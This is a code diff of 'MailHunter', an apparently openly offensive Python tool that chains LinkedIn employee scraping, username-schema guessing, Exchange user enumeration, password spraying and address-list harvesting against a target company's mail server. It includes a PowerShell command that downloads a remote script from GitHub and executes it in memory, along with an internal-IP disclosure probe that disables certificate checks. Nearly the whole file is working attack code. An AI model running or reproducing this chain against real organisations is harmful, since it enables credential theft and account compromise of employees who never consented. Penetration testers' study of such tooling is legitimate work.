@@ -1,7 +1,7 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
-import time, getpass, re, os, signal, sys, zipfile, urllib.request, socket
+import time, getpass, re, os, signal, sys, zipfile, urllib.request, socket, ssl
 
 def signal_handler(sig, frame):
     print('You pressed Ctrl+C!')
@@ -28,7 +28,7 @@ def setup_env():
     signal.signal(signal.SIGINT, signal_handler)
 
 def clean_users(tmp):
-    f = open("linkedin_employees.txt","w")
+    f = open("1_linkedin_employees.txt","w")
     result = tmp.split("$$$,")
     for line in result:
         firstname = line.split(" ")[0].lower()
@@ -135,18 +135,18 @@ def get_employees(username, password, company_id):
     clean_users(result)
 
 def internalIP(server):
-    IP = socket.gethostbyname(server)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((IP, 80))
-    s.sendall(b'GET /autodiscover/autodiscover.xml HTTP/1.0 \r\n\r\n')
-    data = s.recv(1024)
+    s.connect((server, 443))
+    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
+    s.sendall(b"GET /autodiscover/autodiscover.xml HTTP/1.0 \r\n\r\n")
+    data = s.recv(2048)
     s.close()
     for x in data.decode("utf-8").split("\r\n"):
         if "basic realm" in x.lower():
             print("Found the internal IP:", x.split('"')[1])
             return
     
-    print("Mail server not vulnerable!")
+    print("Mail server not vulnerable to internal IP enumeration!")
 
 def mailsniper_internaldomain(server, company_name):
     command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + '; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute"'
@@ -154,7 +154,7 @@ def mailsniper_internaldomain(server, company_name):
     os.system(command)
 
 def name_schema():
-    fread = open("linkedin_employees.txt","r")
+    fread = open("1_linkedin_employees.txt","r")
     lines = fread.readlines()
     fread.close()
     fwrite = open('tmp.txt', 'w')
@@ -177,10 +177,10 @@ def name_schema():
     fwrite.close()
 
 def name_schema_generate(schema):
-    fread = open("linkedin_employees.txt","r")
+    fread = open("1_linkedin_employees.txt","r")
     lines = fread.readlines()
     fread.close()
-    fwrite = open("schema_name_generated.txt","w")
+    fwrite = open("3_schema_name_generated.txt","w")
     if schema == "1":
         for line in lines:
             user = line.strip("\n")
@@ -231,10 +231,10 @@ def ruler_addresslist(server, email, user, password, outfile):
     os.system(command)
 
 def modify_address_list(internal_domain):
-    fread = open("address_list.txt","r")
+    fread = open("6_address_list.txt","r")
     lines = fread.readlines()
     fread.close()
-    fwrite = open("modified_address_list.txt", "w")
+    fwrite = open("7_modified_address_list.txt", "w")
     for line in lines:
         line1 = line.split(" ")[-1]
         line2 = line1.split("@")[0].strip("\n")
@@ -247,147 +247,161 @@ def modify_address_list(internal_domain):
 try:
     setup_env()
     
-    print("Welcome to MailHunter tool.")
-    print("Choose What you want to do...")
-    print("0- Full MailHunter attack chain.")
-    print("1- Get employees from linkedin company.")
-    print("2- Get company internal domain.")
-    print("3- Identify company employees name schema.")
-    print("4- Generate employees based on the identified name schema.")
-    print("5- Start users enumeration process.")
-    print("6- Start password spraying attack.")
-    print("7- Get employees global address list.")
-    print("8- Get the mail server internal IP.")
-    
-    choice = input("Please enter your choice: ")
-    
-    if choice == "0":
-        print("Enter your linkedin information...")
-        username = input('Enter your email: ')
-        password = getpass.getpass('Enter your password: ')
-        company_id = input('Enter the linkedin company ID you want to search: ')
-    
-        print("Exec get employees.")
-        get_employees(username, password, company_id)
-    
-        server = input('Enter the company exchange server domain: ')
-        company_name = input('Enter the comapany name: ')
+    while(1):
+        print("")
+        print("##################################")
+        print(">>> Welcome to MailHunter tool <<<")
+        print("##################################")
+        print("Choose What you want to do...")
+        print("")
+        print("0- Full MailHunter attack chain.")
+        print("1- Get employees from linkedin company.")
+        print("2- Get company mail server internal IP.")
+        print("3- Get company internal domain.")
+        print("4- Identify company employees name schema.")
+        print("5- Generate employees based on the identified name schema.")
+        print("6- Start users enumeration process.")
+        print("7- Start password spraying attack.")
+        print("8- Get employees global address list.")
+        print("9- Exit the program.")
+        print("")
         
-        print("Exec internal domain enumeration.")
-        mailsniper_internaldomain(server, company_name)
+        choice = input("Please enter your choice: ")
         
-        print("Exec name schema.")
-        name_schema()
+        if choice == "0":
+            print("Enter your linkedin information...")
+            username = input('Enter your email: ')
+            password = getpass.getpass('Enter your password: ')
+            company_id = input('Enter the linkedin company ID you want to search: ')
         
-        internal_domain = input('Enter the comapany internal domain: ')
+            print("Exec get employees.")
+            get_employees(username, password, company_id)
         
-        print("Exec user enum.")
-        mailsniper_userenum(server, internal_domain, "tmp.txt", "intial_employees_schema.txt")
-        os.remove("tmp.txt")
-    
-        print("Enter the employees identified name schema...")
-        print("1- Firstname.Lastname example hassan.saad")
-        print("2- FirstnameLastname exmaple hassansaad")
-        print("3- FirstnameChar.Lastname example h.saad")
-        print("4- FirstnameCharLastname example hsaad")
-        schema = input('Enter your choice: ')
+            server = input('Enter the company exchange server domain: ')
+            company_name = input('Enter the comapany name: ')
+            
+            print("Exec internal IP enumeration.")
+            internalIP(server)
+            
+            print("Exec internal domain enumeration.")
+            mailsniper_internaldomain(server, company_name)
+            
+            print("Exec name schema.")
+            name_schema()
+            
+            internal_domain = input('Enter the comapany internal domain: ')
+            
+            print("Exec user enum.")
+            mailsniper_userenum(server, internal_domain, "tmp.txt", "2_intial_employees_schema.txt")
+            os.remove("tmp.txt")
         
-        print("Exec name schema generate.")
-        name_schema_generate(schema)
-    
-        print("Exec user enum.")
-        mailsniper_userenum(server, internal_domain, "schema_name_generated.txt", "valid_employees_usernames.txt")
+            print("Enter the employees identified name schema...")
+            print("1- Firstname.Lastname example hassan.saad")
+            print("2- FirstnameLastname exmaple hassansaad")
+            print("3- FirstnameChar.Lastname example h.saad")
+            print("4- FirstnameCharLastname example hsaad")
+            schema = input('Enter your choice: ')
+            
+            print("Exec name schema generate.")
+            name_schema_generate(schema)
         
-        password = input('Enter the password you want to try: ')
-        print("Exec password spray.")
-        mailsniper_passwordspray(server, password, "valid_employees_usernames.txt", "intial_valid_passwords.txt")
-        
-        valid_email = input('Enter a valid email (username@domain.com): ')
-        valid_username = input('Enter a valid username: ')
-        valid_password = input('Enter a valid password: ')
-       
-        print("Exec address list.")
-        ruler_addresslist(server, valid_email, valid_username, valid_password, "address_list.txt")
+            print("Exec user enum.")
+            mailsniper_userenum(server, internal_domain, "3_schema_name_generated.txt", "4_valid_employees_usernames.txt")
+            
+            password = input('Enter the password you want to try: ')
+            print("Exec password spray.")
+            mailsniper_passwordspray(server, password, "4_valid_employees_usernames.txt", "5_intial_valid_passwords.txt")
+            
+            valid_email = input('Enter a valid email (username@domain.com): ')
+            valid_username = input('Enter a valid username: ')
+            valid_password = input('Enter a valid password: ')
+           
+            print("Exec address list.")
+            ruler_addresslist(server, valid_email, valid_username, valid_password, "6_address_list.txt")
 
-        print("Exec modify address list.")
-        modify_address_list(internal_domain)
+            print("Exec modify address list.")
+            modify_address_list(internal_domain)
+            
+            mailsniper_passwordspray(server, valid_password, "7_modified_address_list.txt", "8_full_valid_passwords.txt")
         
-        mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "full_valid_passwords.txt")
-    
-    elif choice == "1":
-        print("Enter your linkedin information...")
-        username = input('Enter your email: ')
-        password = getpass.getpass('Enter your password: ')
-        company_id = input('Enter the linkedin company ID you want to search: ')
-    
-        print("Exec get employees.")
-        get_employees(username, password, company_id)
-    
-    elif choice == "2":
-        server = input('Enter the company exchange server domain: ')
-        company_name = input('Enter the comapany name: ')
+        elif choice == "1":
+            print("Enter your linkedin information...")
+            username = input('Enter your email: ')
+            password = getpass.getpass('Enter your password: ')
+            company_id = input('Enter the linkedin company ID you want to search: ')
         
-        print("Exec internal domain enumeration.")
-        mailsniper_internaldomain(server, company_name)
+            print("Exec get employees.")
+            get_employees(username, password, company_id)
         
-    elif choice == "3":
-        print("Exec name schema.")
-        name_schema()
+        elif choice == "2":
+            server = input('Enter the company exchange server domain: ')
+            internalIP(server)
         
-        server = input('Enter the company exchange server domain: ')
-        internal_domain = input('Enter the comapany internal domain: ')
+        elif choice == "3":
+            server = input('Enter the company exchange server domain: ')
+            company_name = input('Enter the comapany name: ')
+            
+            print("Exec internal domain enumeration.")
+            mailsniper_internaldomain(server, company_name)
+            
+        elif choice == "4":
+            print("Exec name schema.")
+            name_schema()
+            
+            server = input('Enter the company exchange server domain: ')
+            internal_domain = input('Enter the comapany internal domain: ')
+            
+            print("Exec user enum.")
+            mailsniper_userenum(server, internal_domain, "tmp.txt", "2_intial_employees_schema.txt")
+            os.remove("tmp.txt")
         
-        print("Exec user enum.")
-        mailsniper_userenum(server, internal_domain, "tmp.txt", "intial_employees_schema.txt")
-        os.remove("tmp.txt")
-    
-    elif choice == "4":
-        print("Enter the employees identified name schema...")
-        print("1- Firstname.Lastname example hassan.saad")
-        print("2- FirstnameLastname exmaple hassansaad")
-        print("3- FirstnameChar.Lastname example h.saad")
-        print("4- FirstnameCharLastname example hsaad")
-        schema = input('Enter your choice: ')
+        elif choice == "5":
+            print("Enter the employees identified name schema...")
+            print("1- Firstname.Lastname example hassan.saad")
+            print("2- FirstnameLastname exmaple hassansaad")
+            print("3- FirstnameChar.Lastname example h.saad")
+            print("4- FirstnameCharLastname example hsaad")
+            schema = input('Enter your choice: ')
+            
+            print("Exec name schema generate.")
+            name_schema_generate(schema)
+            
+        elif choice == "6":
+            server = input('Enter the company exchange server domain: ')
+            internal_domain = input('Enter the comapany internal domain: ')
         
-        print("Exec name schema generate.")
-        name_schema_generate(schema)
-        
-    elif choice == "5":
-        server = input('Enter the company exchange server domain: ')
-        internal_domain = input('Enter the comapany internal domain: ')
-    
-        print("Exec user enum.")
-        mailsniper_userenum(server, internal_domain, "schema_name_generated.txt", "valid_employees_usernames.txt")
-        
-    elif choice == "6":
-        server = input('Enter the company exchange server domain: ')
-        password = input('Enter the password you want to try: ')
-        whichfile = input('Which file you want, 1- valid_employees_usernames.txt OR 2- modified_address_list.txt: ')
-        print("Exec password spray.")
-        if whichfile == "1":
-            mailsniper_passwordspray(server, password, "valid_employees_usernames.txt", "intial_valid_passwords.txt")
-        elif whichfile == "2":
-            mailsniper_passwordspray(server, password, "modified_address_list.txt", "full_valid_passwords.txt")
-        
-    elif choice == "7":
-        server = input('Enter the company exchange server domain: ')
-        internal_domain = input('Enter the comapany internal domain: ')
-        valid_email = input('Enter a valid email (username@domain.com): ')
-        valid_username = input('Enter a valid username: ')
-        valid_password = input('Enter a valid password: ')
-        
-        print("Exec address list.")
-        ruler_addresslist(server, valid_email, valid_username, valid_password, "address_list.txt")
+            print("Exec user enum.")
+            mailsniper_userenum(server, internal_domain, "3_schema_name_generated.txt", "4_valid_employees_usernames.txt")
+            
+        elif choice == "7":
+            server = input('Enter the company exchange server domain: ')
+            password = input('Enter the password you want to try: ')
+            whichfile = input('Which file you want, 1- valid_employees_usernames.txt OR 2- modified_address_list.txt: ')
+            print("Exec password spray.")
+            if whichfile == "1":
+                mailsniper_passwordspray(server, password, "4_valid_employees_usernames.txt", "5_intial_valid_passwords.txt")
+            elif whichfile == "2":
+                mailsniper_passwordspray(server, password, "7_modified_address_list.txt", "8_full_valid_passwords.txt")
+            
+        elif choice == "8":
+            server = input('Enter the company exchange server domain: ')
+            internal_domain = input('Enter the comapany internal domain: ')
+            valid_email = input('Enter a valid email (username@domain.com): ')
+            valid_username = input('Enter a valid username: ')
+            valid_password = input('Enter a valid password: ')
+            
+            print("Exec address list.")
+            ruler_addresslist(server, valid_email, valid_username, valid_password, "6_address_list.txt")
 
-        print("Exec modify address list.")
-        modify_address_list(internal_domain)
-    
-    elif choice == "8":
-        server = input('Enter the company exchange server domain: ')
-        internalIP(server)
-    
-    else:
-        print("Unrecognized option !!!")
+            print("Exec modify address list.")
+            modify_address_list(internal_domain)
+        
+        elif choice == "9":
+            print("Bye bye.")
+            sys.exit(0)
+        
+        else:
+            print("Unrecognized option !!!")
     
 except Exception as e:
     print('Exception has occurred!', e)
